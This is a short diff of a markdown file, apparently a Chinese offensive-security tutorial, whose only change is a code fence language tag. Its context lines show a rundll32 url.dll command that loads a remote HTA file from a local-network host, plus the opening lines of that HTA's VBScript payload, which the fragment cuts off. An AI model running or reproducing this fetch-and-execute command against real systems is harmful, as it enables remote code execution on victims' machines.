@@ -83,7 +83,7 @@ rundll32.exe url.dll,OpenURL http://192.168.1.4/Micropoor_url_dll.hta
 
 ### 附录：Micropoor_url_dll.hta
 
-```VB
+```visual-basic
 <script language="VBScript"> 
 
 Dim binary : binary = "rundll32.exe" 
